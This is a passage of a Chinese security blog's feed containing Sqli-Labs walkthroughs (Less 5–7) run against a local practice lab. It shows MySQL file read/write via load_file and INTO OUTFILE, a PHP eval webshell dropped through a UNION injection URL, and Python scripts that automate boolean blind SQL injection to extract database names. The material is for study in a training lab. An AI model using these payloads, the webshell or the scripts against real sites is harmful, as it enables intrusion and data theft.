<h1 id="php序列化函数"><a href="#php序列化函数" class="headerlink" title="php序列化函数"></a>php序列化函数</h1><ul>
<li>serialize()</li>
<li>unserialize()</li>
<li>ini_set(‘session.serialize_handler’, ‘php_serialize’);</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93.html" target="_blank" rel="external">代码审计入门总结</a></li>
<li><a href="http://www.jianshu.com/p/33bc37ef72cc" target="_blank" rel="external">php花式读取文件函数汇总</a></li>
<li><a href="https://book.ph0en1x.com/web/phpdai-ma-shen-ji-xiao-zong-jie.html" target="_blank" rel="external">Awesome-CTF-Book</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php代码审计小总结&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less7-writeup</title>
    <link href="http://yoursite.com/2017/07/12/Sqli-Labs-Less7-writeup/"/>
    <id>http://yoursite.com/2017/07/12/Sqli-Labs-Less7-writeup/</id>
    <published>2017-07-12T01:52:18.000Z</published>
    <updated>2017-07-26T10:57:40.454Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less7 是 dump out file<br><a id="more"></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。</p>
<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h2><p>用于读取本地文件内容。有几个条件限制：</p>
<ul>
<li>需要有读取文件的权限</li>
<li>需要知道文件的绝对物理路径。</li>
</ul>
<p>假设C盘里有一个TEST.txt文件，内容为chybeta。几种读取方式如下：</p>
<h3 id="直接使用绝对路径"><a href="#直接使用绝对路径" class="headerlink" title="直接使用绝对路径"></a>直接使用绝对路径</h3><p>注意对路径中斜杠的处理。</p>
<ul>
<li>mysql&gt; select load_file(“C://TEST.txt”);</li>
<li>mysql&gt; select load_file(“C:/TEST.txt”);</li>
<li>mysql&gt; select load_file(“C:\TEST.txt”);</li>
</ul>
<p>以上返回结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------+</div><div class="line">| load_file(&quot;C://TEST.txt&quot;) |</div><div class="line">+---------------------------+</div><div class="line">| chybeta                   |</div><div class="line">+---------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<p>但若输入以下查询则会返回空即不成功。</p>
<p>mysql&gt; select load_file(“C:\TEST.txt”);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+--------------------------+</div><div class="line">| load_file(&quot;C:\TEST.txt&quot;) |</div><div class="line">+--------------------------+</div><div class="line">| NULL                     |</div><div class="line">+--------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<h3 id="使用编码"><a href="#使用编码" class="headerlink" title="使用编码"></a>使用编码</h3><h4 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h4><p>以<code>C:\\TEST.txt</code>为例。对其进行ascii编码后利用char（）进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select load_file(char(67,58,92,92,84,69,83,84,46,116,120,116));</div></pre></td></tr></table></figure></p>
<p>返回结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------------------------------------+</div><div class="line">| load_file(char(67,58,92,92,84,69,83,84,46,116,120,116)) |</div><div class="line">+---------------------------------------------------------+</div><div class="line">| chybeta                                                 |</div><div class="line">+---------------------------------------------------------+</div><div class="line">1 row in set (0.02 sec)</div></pre></td></tr></table></figure></p>
<h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><p>以<code>C:\\TEST.txt</code>为例。对其进行十六进制编码后进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select load_file(0x433a5c5c544553542e747874);</div></pre></td></tr></table></figure></p>
<p>返回结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------------------+</div><div class="line">| load_file(0x433a5c5c544553542e747874) |</div><div class="line">+---------------------------------------+</div><div class="line">| chybeta                               |</div><div class="line">+---------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><p>可以用来导出文件/数据到文件中。语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * INTO OUTFILE &apos;file_name&apos;</div></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * INTO DUMPFILE &apos;file_name&apos;</div></pre></td></tr></table></figure></p>
<p>file_name处一般要指定绝对路径，否则就会导出到mysql的目录下。同时对需导出的目录有可写权限。对file_name，可以有以下几种编码方式，注意对路径分隔符的处理：</p>
<h3 id="数据导出"><a href="#数据导出" class="headerlink" title="数据导出"></a>数据导出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select database() into outfile &apos;C:\\phpstudy\\WWW\\test\\1&apos;;</div><div class="line">Query OK, 1 row affected (0.09 sec)</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;</div><div class="line">Query OK, 1 row affected (0.00 sec)</div></pre></td></tr></table></figure>
<p>这里是假设写入到文件1中。在实际测试中，要outfile出的文件不能已经存在，否则会报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;</div><div class="line">ERROR 1086 (HY000): File &apos;C:/phpstudy/WWW/test/1&apos; already exists</div></pre></td></tr></table></figure></p>
<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>outfile还可以用来写入webshell。前提是：</p>
<ul>
<li>需要知道网站的绝对物理路径，这样导出后的webshell可访问</li>
<li>对需导出的目录有可写权限。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select &quot;&lt;?php eval($_POST[&apos;chybeta&apos;])?&gt;&quot; into outfile &apos;C:/phpstudy/WWW/test/webshell.php&apos;;</div><div class="line">Query OK, 1 row affected (0.00 sec)</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170712/1.jpg?raw=true" alt=""></p>
<h1 id="Lees-7"><a href="#Lees-7" class="headerlink" title="Lees 7"></a>Lees 7</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php eval($_POST[&quot;chybeta&quot;]) ?&gt;&apos; into outfile &quot;C:\\phpstudy\\WWW\\test\\less7.php&quot; %23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170712/2.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less7 是 dump out file&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less5-6-writeup</title>
    <link href="http://yoursite.com/2017/07/12/Sqli-Labs-Less5-6-writeup/"/>
    <id>http://yoursite.com/2017/07/12/Sqli-Labs-Less5-6-writeup/</id>
    <published>2017-07-12T00:38:41.000Z</published>
    <updated>2017-07-26T10:57:37.826Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less5-6是盲注<br><a id="more"></a></p>
<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less 5"></a>Less 5</h1><h2 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h2><p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic2.jpg" alt=""><br>页面正常，返回：You are in……</p>
<h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos;</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic3.jpg" alt=""><br>报错。之后的过程要记得闭合单引号。</p>
<h2 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h2><p>依次访问如下链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=1 --+</div><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=2 --+</div></pre></td></tr></table></figure></p>
<p>页面返回信息不同。同时试着使用UNION SELECT注入，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=&apos; UNION SELECT 1,2,3 --+</div></pre></td></tr></table></figure></p>
<p>页面返回 You are in……返回通用页面。故考虑盲注。这里使用推断攻击技术，通过推断一次一位地逐步提取信息。注入 id=1’ AND (condition)后，通过页面返回的信息来判断condition的真假。当condition为真时，会返回包含“You are in……”的正常页面，当condition为假时，返回空页面。</p>
<h3 id="Exp1"><a href="#Exp1" class="headerlink" title="Exp1"></a>Exp1</h3><h4 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Condition Example:</div><div class="line">SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1),num2,1) = char</div></pre></td></tr></table></figure>
<ul>
<li>num1和num2都是整数，char为单个字符。</li>
<li>(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1)  会返回查询到结果（即各数据库名称）的第num1行。</li>
<li>SUBSTRING(*,num2,1)  返回查询后结果的第num2个字母。</li>
<li>SUBSTRING(*,num2,1) = a 是布尔表达式，根据其真假，页面会返回不同的信息。</li>
</ul>
<h4 id="Something"><a href="#Something" class="headerlink" title="Something"></a>Something</h4><ul>
<li>通过类似的方法，可以先获取数据库的数量，再根据数量依次判断。</li>
<li>通过变化num1，num2，char，可以获取到最后的数据。</li>
<li>多查询一位，通过返回的最后一位是否为空格来判断当前所查询字符串是否已经结束。</li>
</ul>
<h4 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line">dataset = <span class="string">" abcdefghijklmnopqrstuvwxyz_"</span></div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-5/?id=1' "</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		result = <span class="string">""</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> dataset:</div><div class="line">				querysql = <span class="string">"AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span>+str(k)+<span class="string">",1),"</span>+str(i)+<span class="string">",1)='"</span>+j</div><div class="line">				recv = sendPayload(querysql)  </div><div class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">					<span class="keyword">if</span> j != <span class="string">' '</span>:</div><div class="line">						result += j</div><div class="line">						i += <span class="number">1</span></div><div class="line">					<span class="keyword">else</span>:</div><div class="line">						<span class="keyword">print</span> result</div><div class="line">						i = <span class="number">0</span></div><div class="line">  					<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure>
<h4 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h4><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic4.jpg" alt=""></p>
<h3 id="Exp2"><a href="#Exp2" class="headerlink" title="Exp2"></a>Exp2</h3><p>Exp1中，是基于字典进行匹配的，效率低下。可以采用二分法来进行优化。大体思路如上跟Exp1相同。</p>
<h4 id="Condition-1"><a href="#Condition-1" class="headerlink" title="Condition"></a>Condition</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Condition Example:</div><div class="line">ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT  0 ,1), 1 ,1)) &gt; 127</div></pre></td></tr></table></figure>
<p>判断当前第一行的第一个字符的asll码值是否大于127。若该条件为真，则将127替换为 191 （即 （127+255）/2），若该条件为假，则将127替换为63（即（-1+127）/2）</p>
<h4 id="Something-1"><a href="#Something-1" class="headerlink" title="Something"></a>Something</h4><p>在写二分法盲注时遇到了一些问题，想了一些策略，但不知道是不是最好的。如果有更好的做法，希望留言告知</p>
<ul>
<li>搜索范围选择（-1，255），这样能包括的字符ASCII值x满足：0≤x≤255。当判断到所查询字符串结尾时，此时mysql对应的不是空格ASCII码32，而是0。假设所查询的第一个字符串长度为10，当查询到字符串尾部后（即第11个字符），下面这条语句是恒假的：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT  0 ,1), 11 ,1)) &gt; 0</div><div class="line">+ 由于采用了递归二分法。这里用全局变量findBit用来判断当前字符串是否查询结束，若findBit为1，表明已经查完可以直接break跳到下一个查询。</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-5/?id=1' "</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			findBit = <span class="number">0</span></div><div class="line">			doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,k)</div><div class="line">			i += <span class="number">1</span></div><div class="line">			<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">				sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,k)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		querysql = <span class="string">"AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span> + str(k) + <span class="string">",1),"</span> + str(i) + <span class="string">",1)) &gt; "</span> + str(midNum) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(querysql)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(midNum,rightNum,i,k)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(leftNum,midNum,i,k)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure>
<h4 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h4><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic5.jpg" alt=""></p>
<h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less 6"></a>Less 6</h1><h2 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170403/sqlilabsless6/step1.jpg" alt=""></p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&apos;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>无报错</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>页面报错，返回信息： use near ‘“1”” LIMIT 0,1’ at line 1。需要闭合双引号。</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=1 --+</div></pre></td></tr></table></figure>
</li>
</ul>
<p>页面返回正常</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=2 --+</div></pre></td></tr></table></figure>
</li>
</ul>
<p>返回错误页面（空白）</p>
<h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>采用盲注。分析同Less5。exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">'http://localhost:20000/sqllab/Less-6/?id=1" '</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			findBit = <span class="number">0</span></div><div class="line">			doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,k)</div><div class="line">			i += <span class="number">1</span></div><div class="line">			<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">				sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,k)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		querysql = <span class="string">"AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span> + str(k) + <span class="string">",1),"</span> + str(i) + <span class="string">",1)) &gt; "</span> + str(midNum) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(querysql)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			